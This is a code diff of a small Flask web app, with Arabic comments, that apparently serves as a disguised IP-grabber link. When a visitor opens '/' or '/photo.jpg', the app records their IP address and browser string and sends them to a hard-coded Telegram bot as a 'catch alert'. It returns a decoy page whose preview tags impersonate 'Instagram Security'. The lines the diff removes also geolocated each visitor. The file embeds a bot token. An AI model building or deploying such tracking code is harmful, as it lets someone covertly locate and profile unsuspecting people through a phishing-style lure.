@@ -3,48 +3,35 @@ import requests
 
 app = Flask(__name__)
 
-# التوكن المأخوذ من صورة BotFather مباشرة لضمان العمل
+# التوكن والآيدي مأخوذين بدقة من صورك لضمان العمل
 TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQS0zvn6TFWMWuZR0r9cf_CUo"
 CHAT_ID = "8524242091" 
 
 def send_to_telegram(message):
+    # تم تصحيح الكلمة من bet إلى bot هنا
     url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
     try:
-        # زيادة المهلة لضمان الإرسال من سيرفرات Vercel
         requests.post(url, json=payload, timeout=10)
     except:
         pass
 
 @app.route('/')
-@app.route('/check-status')
 @app.route('/photo.jpg')
 def track():
-    # جلب الـ IP الحقيقي عبر Vercel
-    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
-    user_agent = request.headers.get('User-Agent', 'Unknown')
+    # جلب الـ IP من هيدرز Vercel
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    ua = request.headers.get('User-Agent', 'Unknown')
     
-    # جلب معلومات الموقع (اختياري، إذا فشل سيكمل الكود)
-    try:
-        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5).json()
-        location = f"{geo_res.get('city', 'Unknown')}, {geo_res.get('country', 'Unknown')}"
-        isp = geo_res.get('isp', 'Unknown')
-    except:
-        location = isp = "Error Fetching Data"
-
     report = (
         f"🎯 <b>تنبيه صيد جديد!</b>\n"
-        f"--------------------------\n"
-        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
-        f"📍 <b>الموقع:</b> {location}\n"
-        f"🏢 <b>المزود:</b> {isp}\n"
-        f"📱 <b>الجهاز:</b> {user_agent}\n"
-        f"--------------------------"
+        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+        f"📱 <b>الجهاز:</b> {ua}"
     )
     
     send_to_telegram(report)
     
-    # إرجاع الصفحة التي طلبتها (Instagram Security) مع كود 200
+    # الصفحة التمويهية التي طلبتها
     return """
     <!DOCTYPE html>
     <html>
@@ -52,12 +39,10 @@ def track():
         <meta property="og:title" content="Instagram Security">
         <meta property="og:description" content="Confirm your identity to continue.">
         <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png/b306391458a7.png">
-        <meta property="og:type" content="website">
     </head>
     <body><h1>404 Not Found</h1></body>
     </html>
     """, 200
 
-# مهم جداً لعمل Vercel
 if __name__ == '__main__':
     app.run()
